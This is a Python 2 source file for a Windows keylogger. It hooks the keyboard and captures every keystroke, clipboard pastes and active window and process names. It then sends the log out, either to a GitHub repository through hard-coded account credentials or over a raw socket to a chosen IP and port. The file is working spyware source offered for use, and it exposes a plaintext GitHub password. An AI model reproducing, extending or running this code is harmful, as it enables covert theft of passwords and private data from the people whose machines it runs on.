a = False
while not a:
	#verify for python
	from ctypes import *
	try:	
		import pythoncom
	except:
		#install package pywin
		continue
	try:
		import pyHook
	except:
		#install package pyHook
		continue
	try:
		from github3 import login
	except:
		#install package github3
		continue
	import win32clipboard
	import sys
	import os
	import base64
	import threading
	from datetime import datetime
	import optparse
	a = True
	print "Packages imported succesfully."

Parser = optparse.OptionParser(usage = "usage: %prog [options] arg1", version = "%prog 1.0")
Parser.add_option("-g", "--github", dest = "filename", help = "Saves the codes on github repo in the file given", metavar = "FILE", default = None)
Parser.add_option("-c", "--continuous", dest = "target_IP_and_port", nargs = 2, help = "Continuously attempt to send captured keys to the given device.", metavar = "IP port", default = None)
(options, args) = Parser.parse_args()


user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
data_to_return = ""
filenumber = 1

def get_current_process():
	global data_to_return
	#handle to foreground window
	hwnd = user32.GetForegroundWindow()
	#get the process id
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))
	#store the id
	process_id = "%d" % pid.value
	#grab executable
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
	#now read its title
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
	#print out the header if we're in the right process
	print
	print "[%s - PID: %s - %s - %s]" % (datetime.now(), process_id, executable.value, window_title.value)
	data_to_return = "[%s - PID: %s - %s - %s]" % (datetime.now(), process_id, executable.value, window_title.value) + "\n"
	#close handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

#Save on github module
def connect_to_github():
	gh = login(username = "alyzuu", password = "151119964013aG")
	repo = gh.repository("alyzuu", "Wkeylogger")
	branch = repo.branch("master")
	return gh,repo,branch

def store_module_result(data, filename):
	global filenumber
	gh,repo,branch = connect_to_github()
	remote_path = "Logs/%s/%d.data" % (filename, filenumber)
	filenumber += 1
	repo.create_file(remote_path, "Storing keys", base64.b64encode(data))
	return

#Send to other device module
def send_to_device(data, target_IP_and_port):
        import socket
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_IP_and_port[0], int(target_IP_and_port[1])))
        client.send(data)
        response = client.recv(1024)
        if response == "q":
                try:
                        sys.exit(0)
                except SystemExit:
                        os._exit(0)

def Option_handler():
        global data_to_return
        if options.filename is not None:
                saver1 = threading.Thread(target = store_module_result, args = (data_to_return, options.filename,))
		saver1.start()
	if options.target_IP_and_port is not None:
                saver2 = threading.Thread(target = send_to_device, args = (data_to_return, options.target_IP_and_port,))
		saver2.start()
        
def KeyStroke(event):
	global current_window, data_to_return
	#check to see if the target changed the window
	if event.WindowName != current_window:
		current_window = event.WindowName
		Option_handler()
		get_current_process()
	if event.Ascii > 32 and event.Ascii < 127:
		print chr(event.Ascii),
		data_to_return += chr(event.Ascii)
	else:
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			print "[PASTE] - %s" % (pasted_value),
			data_to_return += "[PASTE] - %s" % (pasted_value) + " "
		else:
			print "[%s]" % event.Key,
			data_to_return += "[%s]" % event.Key + " "
	return True

kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

try:
        kl.HookKeyboard()
        pythoncom.PumpMessages()
except KeyboardInterrupt:
        try:
                sys.exit(0)
        except SystemExit:
                os._exit(0)
        
